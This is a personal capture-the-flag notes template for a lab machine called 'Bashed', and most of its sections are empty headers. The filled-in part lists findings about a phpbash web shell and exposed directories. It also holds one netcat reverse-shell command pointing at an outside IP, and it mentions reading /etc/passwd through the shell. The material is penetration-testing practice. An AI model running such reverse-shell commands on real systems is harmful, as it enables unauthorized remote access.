# <span style="color:[COLOR]">Machine #30 Bashed</span>  



## <span style="color:[COLOR]">Checklist 🤓   



<br/><br/>


## <span style="color:[COLOR]">What Do We Have? 🤔🤔 
* Some script called `phpbash` that seems to be running on the server.  
* I tried to visit `http://[IP]/uploads` and it worked. It exists.
* I also tried to send a post request to the uploads with the parameter `cmd`, the command `whoami` didn't work, gave me an error `412 Precondition Failed` but when I tried `pwd` or `cat /etc/passwd` it worked but it didn't return an output. Anyway, it doesn't have to return an output.  
* I also have the source code of the phpbash thing which gives me an upper hand.  
* There's a directory called `/php` it seems according to the contact form I found this `/php/sendMail.php`. 
* I was able to open `/php` and it did not include anything but `sendMail.php` but if I was able to open it doesn't that mean that I have Directory Traversal vulnerability. 
* I think I do have directory traversal.
* Found a `/dev` directory through gobuster and since I have directory traversal I was able to view the directory and find that `phpbash.php` is stored there.

nc -e /bin/sh 10.10.14.72 1234

<br/><br/>


## <span style="color:[COLOR]">Random Notes👀

<br/><br/>  


## <span style="color:[COLOR]">How Did I Own This Shit 😎🥳  

<br/><br/>



## <span style="color:[COLOR]">Where I Got Stuck?😡😧  


<br/><br/>



## <span style="color:[COLOR]">What Did I learn from this Machine?👀  


<br/><br/>



## <span style="color:[COLOR]">Writeups ✍🏽📓   


<br/><br/>

<!-- @nested-tags:EXAMPLE/OF/NESTED/TAGS-->  
